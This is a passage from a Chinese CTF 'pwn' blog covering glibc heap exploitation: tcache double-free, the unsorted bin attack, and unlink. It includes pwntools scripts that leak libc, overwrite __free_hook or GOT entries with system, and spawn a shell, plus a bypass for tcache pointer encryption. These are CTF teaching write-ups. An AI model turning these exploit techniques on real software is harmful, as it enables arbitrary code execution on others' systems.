<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i)   </span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">system = libc_base +libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x101</span>)+p64(free_hook)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x150</span>,payload)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x100</span>,p64(system))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i) </span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>堆块8进入unsortbin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(7)</span><br></pre></td></tr></table></figure>

<p>堆块8与堆块7合并</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x100)</span><br></pre></td></tr></table></figure>

<p>tcachebin中就空出来一个</p>
<p>然后再次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(8)</span><br></pre></td></tr></table></figure>

<p>这时8被free两次，一次在unsortbin中，另一次在tcachebin中，而且形成堆叠，8在7这个合并的大堆块中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(11,0x150,payload)</span><br></pre></td></tr></table></figure>

<p>申请一个大堆块，改堆块8的fd</p>
<p>tcachebin attack</p>
<p>提问：为什么不能先free(7)后free(8)</p>
<p>因为后面double free free(7),unsortbin链表就被破坏了</p>
<p><img src="/2025/11/18/tcache-attack/1757952795005-e27058c9-e98c-4543-9fe4-eb59f25a22a3.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i)   </span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x210</span>,<span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x100</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x110</span>+p64(fd))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>7,8堆块合并进入unsortbin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(10,0x210,b&#x27;\x10&#x27;)</span><br></pre></td></tr></table></figure>

<p>将他两个申请出来，但是有uaf，所以7堆块和10堆块的指针指向同一块地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(11,0x100,b&#x27;/bin/sh\x00&#x27;)</span><br></pre></td></tr></table></figure>

<p>将tachebin空出来一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(8)</span><br></pre></td></tr></table></figure>

<p>进入tachebin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(10)</span><br><span class="line">add(12,0x210,b&#x27;a&#x27;*0x120)</span><br></pre></td></tr></table></figure>

<p>free10，又将10申请出来，12就可以覆盖到8</p>
<h2 id="5-高版本glibc的tcache和fastbin指针加密机制"><a href="#5-高版本glibc的tcache和fastbin指针加密机制" class="headerlink" title="5.高版本glibc的tcache和fastbin指针加密机制"></a><strong>5.高版本</strong>glibc的tcache和fastbin指针加密机制</h2><p>高版本tcachebin有加密机制，当free后堆块地址会加密，我们改fd指针，他会解密，然后就错了，所以我们先按照他的方法加密，写进去他解密就是对的</p>
<p>加密：原来指针^加密指针&gt;&gt;12</p>
<p>heap &#x3D; u64(p.recv(5).ljust(8, b’\x00’))&lt;&lt;12</p>
<p>fd&#x3D;(fd)^(heap)&gt;&gt;12</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/unsortbin-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/unsortbin-attack/" class="post-title-link" itemprop="url">unsortbin attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 12:44:46 / 修改时间：12:45:35" itemprop="dateCreated datePublished" datetime="2025-11-18T12:44:46+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>810</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<p><strong>作用：</strong></p>
<p>Unsorted Bin Attack从字面上就可以看出，正合适一种针对Unsorted Bin机制的攻击手法。这种攻击手法实现的前提是能够控制挂进unsorted bin中的chunk的bk指针，在控制bk指针的情况下可以实现修改任意地址值为一个较大的数值。没错就是较大的数，这个数是不可控的，所以我是真的没有想明白这个攻击手法除了CTF之外还有什么实际的用处😂</p>
<p><strong>Unsorted bin中chunk的主要来源</strong></p>
<p>1.当一个较大的chunk被分割成两部分后，如果剩下的部分大于MINSIZE，则会被放进Unsorted bin中</p>
<p>2.释放一个不属于fast bin的chunk，并且该chunk不与top chunk相邻，该 chunk会被首先放到Unsorted bin中</p>
<p>3.当进行malloc_consolidate（块合并）时，如果合并后的chunk不与top chunk相邻，则可能会把合并后的chunk放到Unsorted bin中</p>
<p><strong>基本使用情况</strong></p>
<p>Unsorted Bin在使用过程中，采用的遍历顺序是FIFO（先进先出），即挂进链表的时候依次从Unsorted bin的头部向尾部挂，取的时候是从尾部向头部取</p>
<p>在程序malloc时，如果fast bin、small bin中找不到对应大小的chunk，就会尝试从Unsorted bin中寻找chunk。如果取出来的chunk的size刚好满足，则直接交给用户，否则就会把这些chunk分别插入到对应的bin中</p>
<p><img src="/2025/11/18/unsortbin-attack/1747919296158-cea0c9f6-4288-423e-ab55-4e79a3cf1282.png" alt="img"></p>
<p>申请两个堆块，第一个小一点方便溢出，第二个一定要在unsortbin，释放第二个堆块，利用uaf或者堆溢出漏洞，将第二个堆块的bk指针改为要改数据的地址-0x10，这样在第二个堆块后面就伪造了一个被free的堆块（这个堆块fd指针的地址刚好就是要改数据的地址），当第二个堆块被申请走，fd指针指向main_arena-88，也就被改为了一个很大的值（其实就是main_arena-88）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/Unlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/Unlink/" class="post-title-link" itemprop="url">Unlink</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 00:28:04 / 修改时间：00:30:23" itemprop="dateCreated datePublished" datetime="2025-11-18T00:28:04+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<h1 id="一-堆溢出unlink"><a href="#一-堆溢出unlink" class="headerlink" title="一.堆溢出unlink"></a>一.堆溢出unlink</h1><p>条件：当使用 <code>free</code> 函数释放一个堆块时，如果相邻的堆块（前一个或后一个）也处于空闲状态，就可能触发 <code>unlink</code> 操作，以将相邻的空闲堆块合并成一个更大的空闲块，从而提高内存的利用率。具体来说，如果被 <code>free</code> 的堆块的 <code>P</code> 位为 <code>0</code>，说明其前一个堆块为空，就会对前一个堆块进行 <code>unlink</code> 操作，将前一个堆块与当前被 <code>free</code> 的堆块进行后向合并；如果相邻的下一个堆块处于空闲状态，则会进行向前合并。</p>
<p>unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量</p>
<p><img src="/2025/11/18/Unlink/1745987610283-775399ae-0dcd-4047-90cd-487f5bd6de1f.png" alt="img">也就是这样</p>
<p><img src="/2025/11/18/Unlink/1745987629124-16f8cba6-0be9-4e63-8e16-5344b0071057.png" alt="img"></p>
<p>那具体拖链是如何实现的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;                                   \</span><br><span class="line">BK = P-&gt;bk;                                   \</span><br><span class="line">FD-&gt;bk = BK;                                  \</span><br><span class="line">BK-&gt;fd = FD;                                  \</span><br></pre></td></tr></table></figure>

<p>也就是我的上一个的下一个&#x3D;我的下一个，我的下一个的上一个&#x3D;我的上一个</p>
<p>FD &#x3D; p-&gt;fd </p>
<p>FD &#x3D; 堆块3chunk头所在的地址</p>
<p>BK &#x3D; P-&gt;bk;</p>
<p>p-&gt;bk</p>
<p>BK &#x3D; 堆块1chunk头所在的地址 </p>
<p>FD-&gt;bk &#x3D; BK;</p>
<p>堆块3的bk指针指向BK（堆块1chunk头所在地址）</p>
<p>BK-&gt;fd &#x3D; FD;</p>
<p>堆块1的fd指针指向FD（堆块3chunk头所在地址）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>

<p>这个也就是p–&gt;fd–&gt;bk &#x3D; p–&gt;bk–&gt;fd &#x3D; p</p>
<p>堆块2的下一个堆块的上一个堆块 &#x3D; 堆块2的上一个堆块的下一个堆块&#x3D;堆块2</p>
<p>那么如何绕过与利用呢？</p>
<p><img src="/2025/11/18/Unlink/1745988850598-fa05768f-84cd-4a21-bd1e-c3192a44d36a.png" alt="img"></p>
<p>就解释一点吧</p>
<p>chunk &#x3D; 0x602280</p>
<p>为什么BK-&gt;fd &#x3D;&#x3D; *(0x602270+0x10)</p>
<p>因为chunk头-0x18就是bk指针所在的地址，*（）也就是解引用bk指针的值，正常得到的是上一个堆块的chunk头所在的地址，在这里得到的就是堆块2chunk头所在的地址</p>
<p>在这里BK-&gt;fd &#x3D;FD，就是*(0x602270+0x10) &#x3D; 0x602268</p>
<p>也就是往chunk里面写入了chunk-0x18的值</p>
<p>也就是将堆指针指向的地址改成了chunk-0x18</p>
<p>然后我们往堆块2中写入东西，他就会往堆指针指向的地址里面写，也就是往这个地址里面写0x602268，顺着往下写就会写入0x602280，那么就可以将堆的指针指向的地址改为任意值，就实现任意地址写了</p>
<p>我们结合题目看一下</p>
<p>最最最重要的，要把头部构造在指针的位置</p>
<p>触发unlink一定要伪造一个free掉的堆块在指针处，因为unlink比较是和头部比较，而数组中存储的是指针的值，所以要伪造头部在指针处才能绕过保护</p>
<h2 id="1-有打印堆块的功能"><a href="#1-有打印堆块的功能" class="headerlink" title="1.有打印堆块的功能"></a>1.有打印堆块的功能</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;chunk1&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x06020C8</span>-<span class="number">24</span>)+p64(<span class="number">0x06020C8</span>-<span class="number">16</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>

<p>申请两个在unsortbin的堆块，在堆块0中伪造一个free的堆块，并将堆块2的pre_inuse位设为0，这样就伪造堆块0为free掉的堆块，free堆块1就会触发unlink</p>
<p>chunk &#x3D; 0x06020C8</p>
<p>fd &#x3D; chunk-0x18</p>
<p>bk &#x3D; chunk -0x10</p>
<p>看一下gdb</p>
<p><img src="/2025/11/18/Unlink/1745990175332-294dfb78-2d43-4664-a1c7-0618f2f1859d.png" alt="img"></p>
<p>会很明显是往chunk里面写入了chunk - 0x18</p>
<p>然后我们接着修改堆块的内容，也就是往chunk - 0x18中写入数据，先写0x18个垃圾数据，然后再写的就是往chunk中写，也就是往指针所在的地址写，改变指针所存储的值，也就是指针指向的地址</p>
<p>我们将他写为atoi</p>
<p>payload &#x3D; b’a’*24+p64(elf.got[‘atoi’])</p>
<p><img src="/2025/11/18/Unlink/1745990411772-faa1fb83-48c0-46ff-984a-ba3c8ceae0cd.png" alt="img"></p>
<p>可以看到已经成功了</p>
<p>此时可以泄露libc，我们打印这个堆块，就会将atoi的真实地址打印出来</p>
<p>我们再次修改这个堆块的内容，也就是修改atoi的got表，把他改成system，在调用atoi的时候就会触发system，获得shell</p>
<h2 id="2-没有打印堆块的功能"><a href="#2-没有打印堆块的功能" class="headerlink" title="2.没有打印堆块的功能"></a>2.没有打印堆块的功能</h2><p>没有打印堆块，我们就无法泄露libc，但是我们通过都能实现任意地址写了，我们可以将free的got表改为puts</p>
<p>free堆块时候，就可以打印</p>
<p>我们观察gdb，看具体是如何实现的</p>
<p><img src="/2025/11/18/Unlink/1745991124795-89ca2833-bb5b-431d-a3fb-6ee16960acc9.png" alt="img"><br>将第一个堆块指针指向的地址改为free的got表</p>
<p>第二个改为atoi的got表</p>
<p>然后修改第二个堆块的内容为puts函数的plt表这样free堆块时候，就会打印处来堆块的内容，泄露libc</p>
<p><img src="/2025/11/18/Unlink/1745991292233-f22442af-ca74-4873-8fdf-bae789f574d3.png" alt="img"></p>
<p>然后在修改堆块2的内容为system的真实地址</p>
<p>在申请一个堆块，内容写为&#x2F;bin&#x2F;sh\x00</p>
<p>free这个堆块就可以获得shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">FD = <span class="number">0x602150</span><span class="number">-24</span></span><br><span class="line">BK = <span class="number">0x602150</span><span class="number">-16</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(FD)+p64(BK)+b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">payload = b<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">edit(<span class="number">4</span>,len(payload),payload)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>最后：需要注意触发unlink free的堆块的上一个需要是free状态，所以我们要伪造堆块2为free状态，让后free堆块3就会触发unlink</p>
<p>那具体是如何伪造的？</p>
<p>我们在堆块2中再伪造一个假堆块</p>
<p>使pre_size &#x3D; 0</p>
<p>   size &#x3D; 0xn1(n为伪造堆块大小)</p>
<p>   fd &#x3D; chunk-0x18</p>
<p>   bk &#x3D; chunk-0x10</p>
<p>使堆块3</p>
<p>  pre_size &#x3D; 0xn0</p>
<p>  size &#x3D; size(本堆块大小，0xm0) p位为0</p>
<p>这样就伪造堆块2为free状态，然后free堆块3，触发unlink，实现chunk &#x3D; chunk-0x18</p>
<p>当off  by one&#x2F;null时候因为会多一个字节，free后面就是puts，puts的got表就会被破坏，所以要这样子改，将puts的got表改为printf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">51</span>+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">atoi = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoi))</span><br><span class="line">libc_base = atoi-libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">bug()</span><br><span class="line">system = libc_base +libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system)+p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/18/Unlink/1753600644770-ad6cfe54-0ba5-48da-92a9-0015b831c4f5.png" alt="img"></p>
<p><img src="/2025/11/18/Unlink/1753600675716-5cd4aaa9-df63-4a8c-abc1-acfca93c0cc4.png" alt="img"></p>
<p>这里也能看到多了一个0xa</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/off-by/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/off-by/" class="post-title-link" itemprop="url">off by</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 00:25:31 / 修改时间：00:27:43" itemprop="dateCreated datePublished" datetime="2025-11-18T00:25:31+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>9.6k</span>
            </span>
